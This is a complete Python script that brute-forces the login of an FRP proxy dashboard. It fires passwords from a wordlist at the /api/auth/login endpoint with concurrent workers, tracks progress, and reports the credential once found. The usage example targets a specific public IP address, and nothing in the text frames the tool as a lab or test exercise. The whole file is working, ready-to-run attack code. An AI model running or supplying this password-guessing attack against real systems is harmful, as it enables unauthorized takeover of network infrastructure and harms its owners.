#!/usr/bin/env python3
"""
FRP Dashboard brute force - reusable script.

Usage:
  python3 frp_brute.py <target> <username> <wordlist>
  python3 frp_brute.py http://223.109.241.56:8080 admin /tmp/passwords.txt

Uses ThreadPoolExecutor with 5 workers for concurrent requests.
Customize worker count via --workers.
"""
import json, urllib.request, sys, time, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

def try_login(base_url, username, password):
    """Try a single login, return password on success."""
    data = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        urljoin(base_url, "/api/auth/login"),
        data=data,
        headers={"Content-Type": "application/json"}
    )
    try:
        resp = urllib.request.urlopen(req, timeout=8)
        if resp.getcode() == 200:
            return password
        return None
    except urllib.error.HTTPError as e:
        if e.code == 401:
            return None
        return None  # 500, 400, 405 etc — not a success
    except Exception:
        return None  # timeout, connection error

def main():
    parser = argparse.ArgumentParser(description="FRP Dashboard brute force")
    parser.add_argument("target", help="Base URL (e.g. http://target:8080)")
    parser.add_argument("username", help="Login username (default: admin)", nargs="?", default="admin")
    parser.add_argument("wordlist", help="Password file (one per line)")
    parser.add_argument("--workers", type=int, default=5, help="Concurrent workers (default: 5)")
    args = parser.parse_args()

    with open(args.wordlist) as f:
        passwords = [l.strip() for l in f if l.strip()]
    
    print(f"Target:   {args.target}")
    print(f"Username: {args.username}")
    print(f"Dict:     {args.wordlist} ({len(passwords)} passwords)")
    print(f"Workers:  {args.workers}")
    print()

    start = time.time()
    tested = 0
    found = None
    last_report = 0

    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {executor.submit(try_login, args.target, args.username, p): p for p in passwords}
        
        for f in as_completed(futures):
            tested += 1
            result = f.result()
            if result is not None:
                found = result
                elapsed = time.time() - start
                print(f"\n✅ [{tested}] {args.username}:{result} (found in {elapsed:.0f}s)")
                break
            
            # Progress report every 500 attempts
            if tested - last_report >= 500:
                last_report = tested
                elapsed = time.time() - start
                rate = tested / elapsed if elapsed > 0 else 0
                done = tested / len(passwords) * 100
                eta = (len(passwords) - tested) / rate if rate > 0 else 0
                print(f"   {tested}/{len(passwords)} ({done:.0f}%) | {rate:.0f} req/s | ETA {eta:.0f}s")

    elapsed = time.time() - start
    print(f"\nDone: {tested}/{len(passwords)} in {elapsed:.0f}s")
    if found:
        print(f"✅ Password: {found}")
        return 0
    else:
        print("❌ No match found")
        return 1

if __name__ == "__main__":
    sys.exit(main())
